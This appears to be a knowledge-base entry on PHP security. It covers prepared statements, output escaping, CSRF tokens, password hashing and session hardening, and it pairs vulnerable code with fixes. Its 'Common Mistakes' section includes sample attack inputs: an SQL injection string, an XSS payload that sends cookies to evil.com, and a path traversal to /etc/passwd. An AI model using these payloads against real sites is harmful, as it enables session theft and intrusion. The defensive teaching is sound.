---
id: "php-security-common-vulnerabilities"
title: "PHP Security: SQL Injection, XSS, CSRF, and Password Hashing"
language: "php"
category: "security"
tags: ["php", "security", "sql-injection", "xss", "csrf", "password-hashing", "session-security"]
version: "8.2+"
retrieval_hint: "php security SQL injection XSS CSRF file inclusion session fixation password hashing vulnerabilities"
last_verified: "2026-05-24"
confidence: "high"
---

# PHP Security: SQL Injection, XSS, CSRF, and Password Hashing

## When to Use
- Handling user input in PHP applications
- Building forms that accept user data
- Storing and verifying passwords
- Managing user sessions
- Any PHP code that touches the web

## Standard Pattern

```php
<?php

// === SQL INJECTION PREVENTION ===
// ALWAYS use prepared statements with PDO
function findUser(PDO $pdo, string $email): ?array
{
    $stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
    $stmt->execute(['email' => $email]);
    return $stmt->fetch() ?: null;
}

// === XSS PREVENTION ===
// ALWAYS escape output with htmlspecialchars
function displayUserName(string $name): string
{
    return htmlspecialchars($name, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
// In Blade: {{ $name }} auto-escapes. {!! $name !!} does NOT — dangerous!

// === CSRF PROTECTION ===
// Generate and validate CSRF tokens
session_start();

function generateCsrfToken(): string
{
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function validateCsrfToken(string $token): bool
{
    return isset($_SESSION['csrf_token'])
        && hash_equals($_SESSION['csrf_token'], $token);
}

// In form:
// <input type="hidden" name="csrf_token" value="<?= generateCsrfToken() ?>">
// On submit:
// if (!validateCsrfToken($_POST['csrf_token'] ?? '')) {
//     http_response_code(403);
//     die('CSRF validation failed');
// }

// === PASSWORD HASHING ===
// Use password_hash() and password_verify() — NEVER md5/sha1
function createUser(PDO $pdo, string $name, string $email, string $password): int
{
    $hash = password_hash($password, PASSWORD_ARGON2ID);
    // PASSWORD_ARGON2ID is the strongest option in PHP 7.3+
    // PASSWORD_BCRYPT is the fallback (still secure)
    
    $stmt = $pdo->prepare('INSERT INTO users (name, email, password) VALUES (:n, :e, :p)');
    $stmt->execute(['n' => $name, 'e' => $email, 'p' => $hash]);
    return (int) $pdo->lastInsertId();
}

function verifyLogin(PDO $pdo, string $email, string $password): ?array
{
    $user = findUser($pdo, $email);
    if ($user && password_verify($password, $user['password'])) {
        // Check if hash needs rehashing (algorithm/options changed)
        if (password_needs_rehash($user['password'], PASSWORD_ARGON2ID)) {
            $newHash = password_hash($password, PASSWORD_ARGON2ID);
            // Update hash in database
        }
        return $user;
    }
    return null;
}

// === SESSION SECURITY ===
function secureSessionStart(): void
{
    ini_set('session.cookie_httponly', '1');    // Prevent JS access
    ini_set('session.cookie_secure', '1');       // HTTPS only
    ini_set('session.cookie_samesite', 'Lax');   // CSRF protection
    ini_set('session.use_strict_mode', '1');     // Reject uninitialized IDs
    session_start();
}

function regenerateSession(): void
{
    session_regenerate_id(true);  // true = delete old session
}

// Regenerate session on login
function login(int $userId): void
{
    regenerateSession();
    $_SESSION['user_id'] = $userId;
    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
}

// === FILE INCLUSION PREVENTION ===
// NEVER include files based on user input without validation
function loadPage(string $page): string
{
    $allowed = ['home', 'about', 'contact'];
    if (!in_array($page, $allowed, true)) {
        throw new InvalidArgumentException('Invalid page');
    }
    return "pages/{$page}.php";
}

// === INPUT VALIDATION ===
function sanitizeInput(string $input): string
{
    return trim(htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8'));
}

function validateEmail(string $email): bool
{
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

function validateUrl(string $url): bool
{
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}
```

## Common Mistakes

```php
<?php

// WRONG: SQL injection via string concatenation
$email = $_GET['email'];
$stmt = $pdo->query("SELECT * FROM users WHERE email = '$email'");
// Attacker: email = "' OR '1'='1" — returns all users!

// CORRECT: Use prepared statements
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
$stmt->execute(['email' => $_GET['email']]);

// WRONG: XSS via unescaped output
echo "Welcome, " . $_GET['name'];
// Attacker: name = "<script>document.location='https://evil.com/?c='+document.cookie</script>"

// CORRECT: Always escape output
echo "Welcome, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

// WRONG: Using md5/sha1 for passwords
$hash = md5($password);    // Crackable in seconds
$hash = sha1($password);   // Crackable in seconds

// CORRECT: Use password_hash with ARGON2ID
$hash = password_hash($password, PASSWORD_ARGON2ID);

// WRONG: Not using CSRF tokens in forms
// <form method="post" action="/transfer">
//     <input name="amount" type="number">
//     <button>Transfer</button>
// </form>
// Attacker can embed this form on their site!

// CORRECT: Include CSRF token
// <form method="post" action="/transfer">
//     <input type="hidden" name="csrf_token" value="<?= generateCsrfToken() ?>">
//     <input name="amount" type="number">
//     <button>Transfer</button>
// </form>

// WRONG: File inclusion vulnerability
$page = $_GET['page'];
include($page . '.php');
// Attacker: page = "../../../etc/passwd%00" — reads any file!

// CORRECT: Whitelist allowed pages
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed, true)) {
    include($_GET['page'] . '.php');
}

// WRONG: Not regenerating session on login
$_SESSION['user_id'] = $userId;
// Session fixation attack possible!

// CORRECT: Regenerate session ID on privilege change
session_regenerate_id(true);
$_SESSION['user_id'] = $userId;
```

## Gotchas
- `htmlspecialchars()` with `ENT_QUOTES` escapes both single and double quotes. Always use it.
- `password_hash()` generates a random salt automatically. Never provide your own salt.
- `password_verify()` is timing-safe. Use it instead of comparing hashes manually.
- `hash_equals()` is the timing-safe comparison function for general strings.
- CSRF tokens should be per-session, random (use `random_bytes()`), and validated on every state-changing request.
- `session_regenerate_id(true)` deletes the old session. Use `true` to prevent session fixation.
- `filter_var()` with `FILTER_VALIDATE_EMAIL` is more reliable than regex for email validation.
- `strip_tags()` is NOT sufficient for XSS prevention. Always use `htmlspecialchars()` on output.
- File uploads: validate MIME type with `finfo`, not extension. Use `move_uploaded_file()`, not `copy()`.
- Set `session.cookie_httponly` to prevent JavaScript from accessing the session cookie.

## Related
- php/db/pdo.md
- php/stdlib/basics.md
- php/stdlib/error-handling.md
- php/web/laravel-basics.md
